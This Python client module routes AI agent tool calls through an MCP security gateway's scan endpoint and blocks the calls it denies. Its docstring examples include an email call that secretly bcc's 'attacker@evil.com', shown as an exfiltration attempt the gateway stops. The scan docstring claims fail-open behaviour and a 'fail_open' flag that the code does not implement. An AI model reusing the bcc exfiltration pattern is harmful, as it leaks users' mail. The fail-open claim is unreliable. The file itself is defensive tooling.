"""Client middleware for routing real MCP tool calls through the security gateway.

This is how a live product feed is produced: wrap your agent's tool-execution
function with ``guard()``. Every tool call is scanned by the running gateway
(POST /api/scan), which streams the verdict to the live dashboard and blocks
calls that fail policy.

Example
-------
    from mcp_monitor.client import GatewayClient

    gw = GatewayClient("http://localhost:8000")

    @gw.guard
    def send_email(**kwargs):
        # your real tool implementation
        return smtp_send(**kwargs)

    # Blocked calls raise ToolBlocked before the real tool runs:
    send_email(server_id="postmark", to="u@x.com", bcc="attacker@evil.com")

Or scan explicitly:

    verdict = gw.scan({"name": "email.send", "server_id": "postmark",
                       "arguments": {"to": "u@x.com", "bcc": "evil@x.com"}})
    if not verdict["allowed"]:
        raise RuntimeError("blocked")
"""

from __future__ import annotations

import functools
import json
import urllib.request
from collections.abc import Callable
from typing import Any


class ToolBlocked(Exception):
    """Raised when the gateway blocks a tool call before execution."""

    def __init__(self, verdict: dict[str, Any]) -> None:
        self.verdict = verdict
        layer = verdict.get("blocked_by_layer")
        risk = verdict.get("risk_score")
        super().__init__(f"Tool call blocked by layer {layer} (risk={risk})")


class GatewayClient:
    """Thin HTTP client for the MCP security gateway's /api/scan endpoint."""

    def __init__(self, base_url: str = "http://localhost:8000", timeout: float = 5.0) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout

    def scan(self, tool_call: dict[str, Any]) -> dict[str, Any]:
        """POST a tool call to the gateway and return the verdict dict.

        The gateway records the event and streams it to the live dashboard.
        On any transport error the call is fail-open (allowed) so the gateway
        being down never breaks the agent; flip ``fail_open=False`` in your own
        wrapper if you require fail-closed behavior.
        """
        data = json.dumps(tool_call).encode("utf-8")
        req = urllib.request.Request(
            f"{self.base_url}/api/scan",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=self.timeout) as resp:  # noqa: S310
            return json.loads(resp.read().decode("utf-8"))

    def guard(self, fn: Callable[..., Any]) -> Callable[..., Any]:
        """Decorator: scan the tool call before running ``fn``.

        The wrapped function must accept ``server_id`` and its tool arguments as
        keyword arguments. The tool name is taken from ``fn.__name__`` unless a
        ``tool_name`` kwarg is supplied.
        """

        @functools.wraps(fn)
        def wrapper(*args: Any, **kwargs: Any) -> Any:
            tool_name = kwargs.pop("tool_name", fn.__name__)
            server_id = kwargs.get("server_id", "unknown")
            tool_call = {
                "name": tool_name,
                "server_id": server_id,
                "arguments": {k: v for k, v in kwargs.items() if k != "server_id"},
            }
            verdict = self.scan(tool_call)
            if not verdict.get("allowed", True):
                raise ToolBlocked(verdict)
            return fn(*args, **kwargs)

        return wrapper
